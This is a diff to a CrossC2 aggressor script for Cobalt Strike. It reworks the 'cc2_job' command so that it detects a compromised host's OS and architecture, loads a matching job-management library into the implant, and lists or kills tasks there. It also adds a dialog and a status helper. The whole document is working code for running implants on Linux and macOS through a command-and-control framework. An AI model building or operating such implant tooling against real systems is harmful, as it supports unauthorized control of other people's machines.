@@ -2,30 +2,29 @@
 #include(script_resource("CrossC2Kit.cna"));
 
 sub printUsage_jobs {
-    blog($1, "\nUsage: cc2_job <linux(32)/osx> <list/kill> (PID/all)\n\tcc2_job linux list\n\tcc2_job linux kill 222\n\tcc2_job linux kill all\n");
+    blog($1, "\nUsage: cc2_job <list/kill> (PID/all)\n\tcc2_job list\n\tcc2_job kill 222\n\tcc2_job kill all\n");
 }
 
-ssh_alias cc2_job {
+sub cc2_job {
     $taskName = "cc2_job"; # taskName
     $taskType = "so";  # $taskType -> ELF, MachO, so, dylib
     $taskResType = "info"; # info -> normal message
 
     $beaconid = $1;
-    $arch = $2;
-    $jobType = $3;
-    $optionalPID = $4;
+    $jobType = $2;
+    $optionalPID = $3;
     $transportArg = $jobType . "^" . $optionalPID;
-
-    if ($arch eq "osx") {
+    $arch = beacon_info($beaconid, "arch");
+    $os = lc(beacon_info($beaconid, "os"));
+    if ('linux' isin $os) {
+        $loadlib = 'errorlog.so';
+        if ($arch eq 'x86') {
+            $loadlib = "jobs/cc2_jobs32.so";
+        } else if ($arch eq 'x64') {
+            $loadlib = "jobs/cc2_jobs.so";
+        }
+    } else if ('macos' isin $os) {
         $loadlib = "jobs/cc2_jobs.dylib";
-    } else if ($arch eq "linux32") {
-        $loadlib = "jobs/cc2_jobs32.so";
-    } else if ($arch eq "linux") {
-        $loadlib = "jobs/cc2_jobs.so";
-    } else {
-        berror($beaconid, "*[error]: system");
-        printUsage_jobs($beaconid);
-        return;
     }
 
     if ($jobType) {
@@ -40,7 +39,7 @@ ssh_alias cc2_job {
             printUsage_jobs($beaconid);
             return;
         }
-        blog($beaconid, "cc2_job: ");
+        binput($beaconid, "cc2_job $jobType $optionalPID");
         bcrossc2_load_dyn($beaconid, $taskType, $taskName, $taskResType, $loadlib, $transportArg);
     } else {
         berror($beaconid, "*[error]: job type");
@@ -48,4 +47,40 @@ ssh_alias cc2_job {
     }
 }
 
-ssh_command_register("cc2_job", "CrossC2 joblist - Manage running tasks", "\nUsage: cc2_job <linux(32)/osx> <list/kill> (PID/all)\n\tcc2_job linux list\n\tcc2_job linux kill 222\n\tcc2_job linux kill all\n");
+ssh_alias("cc2_job", &cc2_job);
+
+ssh_command_register("cc2_job", "CrossC2 joblist - Manage running tasks", "\nUsage: cc2_job <list/kill> (PID/all)\n\tcc2_job linux list\n\tcc2_job kill 222\n\tcc2_job kill all\n");
+
+
+sub openJobDialog {
+    local('$bid $dialog');
+    foreach $bid($1) {
+        if ($2[0] eq "list") {
+            cc2_job($bid, "list");
+        } else if ($2[1] eq "all") {
+            cc2_job($bid, "kill", "all");
+        } else {
+            prompt_text("Kill PID", "<PID>", lambda({
+                cc2_job($bid, "kill", "$1");
+            }, $bid => $bid));
+        }
+    }
+}
+
+
+sub cc2_job_status {
+    local('$bid $os $arch $system');
+    $bid = $1;
+    $os = lc(beacon_info($bid, "os"));
+    $arch = beacon_info($bid, "arch");
+    if ('linux' isin $os) {
+        if ($arch eq 'x86') {
+            return 'Linux32';
+        } else if ($arch eq 'x64') {
+            return 'Linux64';
+        }
+    } else if ('macos' isin $os) {
+        return 'MacOS(intel)';
+    }
+    return '';
+}
